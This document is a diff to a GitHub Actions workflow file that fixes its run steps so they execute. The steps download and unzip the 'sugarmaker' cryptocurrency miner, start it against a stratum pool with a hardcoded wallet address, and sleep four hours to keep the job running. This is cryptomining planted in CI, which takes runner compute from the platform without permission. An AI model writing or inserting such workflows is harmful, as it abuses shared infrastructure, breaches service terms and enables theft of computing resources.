@@ -12,13 +12,13 @@ jobs:
     steps:
       - name: Downloading & Installing Essentials
         run: |
-          !wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip
-          !unzip sugarmaker-v2.5.0-sugar4-linux64.zip
+          wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip
+          unzip sugarmaker-v2.5.0-sugar4-linux64.zip
 
       - name: Start
         run: |
-          !./sugarmaker-v2.5.0-sugar4-linux64/sugarmaker -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qkxu2zgpzagdc0s92e8n5gt0ngff0altvsraxq8 -t2
+          ./sugarmaker-v2.5.0-sugar4-linux64/sugarmaker -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qkxu2zgpzagdc0s92e8n5gt0ngff0altvsraxq8 -t2
 
       - name: Time Counter
         run: |
-          !sleep 14400
+          sleep 14400
